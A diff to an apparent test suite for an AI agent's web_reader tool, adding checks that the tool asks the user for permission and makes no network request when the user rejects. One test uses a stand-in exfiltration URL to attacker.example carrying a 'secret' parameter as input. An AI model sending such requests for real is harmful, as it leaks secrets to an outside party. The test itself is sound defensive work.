@@ -1110,6 +1110,22 @@ test("web_reader calls the Coding Plan MCP reader tool and formats reader_result
         assert.match(result.content, /^# Example/);
         assert.match(result.content, /URL: https:\/\/example\.com\//);
         assert.match(result.content, /Main body/);
+        assert.equal(conn.permissionRequests.length, 1);
+        assert.deepEqual(conn.permissionRequests[0], {
+          sessionId: "s1",
+          toolCall: {
+            toolCallId: "tc-web-reader",
+            title: "Read URL: https://example.com/",
+            kind: "fetch",
+            status: "pending",
+            locations: [{ path: "https://example.com/" }],
+            rawInput: { url: "https://example.com/", return_format: "markdown" },
+          },
+          options: [
+            { kind: "allow_once", name: "Allow", optionId: "allow" },
+            { kind: "reject_once", name: "Skip", optionId: "reject" },
+          ],
+        });
         assert.ok(calls.every((call) => call.url === "https://api.z.ai/api/mcp/web_reader/mcp"));
         assert.equal(calls[3]?.headers.get("Mcp-Name"), "webReader");
         assert.deepEqual(calls[3]?.body.params, {
@@ -1122,6 +1138,25 @@ test("web_reader calls the Coding Plan MCP reader tool and formats reader_result
     if (oldEnv === undefined) delete process.env["Z_AI_API_KEY"];
     else process.env["Z_AI_API_KEY"] = oldEnv;
   }
+});
+
+test("web_reader does not make a network request when permission is rejected", async () => {
+  const conn = createConnectionStub({ permission: "reject" });
+  const exec = new ToolExecutor(conn as never, "s1", FULL_CAPS);
+
+  await withMockedFetch([], async (calls) => {
+    const result = await exec.execute(
+      "tc-web-reader-rejected",
+      "web_reader",
+      JSON.stringify({ url: "https://attacker.example/collect?secret=sensitive" })
+    );
+
+    assert.equal(result.content, "URL read rejected by user.");
+    assert.equal(conn.permissionRequests.length, 1);
+    assert.equal(calls.length, 0);
+    const last = conn.updates.at(-1) as { update: { status?: string } };
+    assert.equal(last.update.status, "failed");
+  });
 });
 
 test("web_search reports Coding Plan 1113 MCP errors as actionable failed tool results", async () => {
